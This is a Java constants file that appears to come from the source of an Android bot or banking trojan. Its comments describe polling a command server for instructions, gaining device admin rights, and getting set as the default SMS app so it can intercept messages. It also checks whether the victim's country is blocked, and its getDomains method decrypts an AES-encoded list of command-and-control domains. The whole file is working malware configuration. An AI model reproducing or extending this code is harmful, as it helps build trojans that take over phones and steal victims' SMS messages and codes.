package com.moonny.constants;

import android.content.Context;
import com.moonny.Modules;
import com.moonny.helpers.Utils;

public class Constant {

    // main
    public static final String BUILD = "TEST";
    public static final long MAIN_SLEEP = 60 * 1000; // how often ask server for commands
    public static final int API_TRIES = 5; // attempts to send request for each domain

    public static final boolean ADMIN_REQUIRED = true; // get admin rights
    public static final boolean SMS_ADMIN_REQUIRED = false; // user should set app as default SMS messenger when intercept is enabled
    public static final boolean SMS_ADMIN_REQUIRED_ON_START = false; // user should set app as default SMS messenger right after install the bot

    // debug
    public static final boolean DEBUG = false;
    public static final boolean SKIP_COUNTRY_CHECK = false; // skip check if country or language is blocked

    // servers: %SERVERS%
    public static final String API_SERVER = ""; // aes encoded servers srv|srv|srv

    public static String getDomains(Context context)
    {
        // decrypt constant AES domains
        String default_domains = Utils.aes_decrypt(Constant.API_SERVER, Utils.md5(S.api_header_value));

        // get new domains from prefs / should be merged already in AlarmReceiver
        String result = (String) Modules.main(context, S.get_pref, new Object[]{ S.api_server, default_domains });
        if(result == null)
            result = default_domains;

        // return full list
        return result;
    }
}
